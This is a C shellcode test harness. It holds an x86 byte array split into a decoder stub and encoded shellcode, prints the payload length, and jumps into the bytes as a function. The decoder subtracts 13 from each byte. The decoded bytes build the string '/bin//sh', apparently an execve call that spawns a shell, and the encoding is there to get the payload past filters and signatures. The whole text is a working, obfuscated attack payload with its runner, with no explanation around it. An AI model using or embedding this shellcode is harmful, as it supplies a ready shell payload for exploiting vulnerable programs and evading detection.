#include <stdio.h>
#include <string.h>

unsigned char code[] =
// Decoder stub:
"\xeb\x24\x5e\x31\xc9\xb1\x19\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2"
"\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05"
"\xe8\xd7\xff\xff\xff"
// Encoded shellcode:
"\x3e\xcd\x5d\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\x96\xef\x60"
"\x96\xee\xbd\x18\xda\x8d";

int main(void) {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
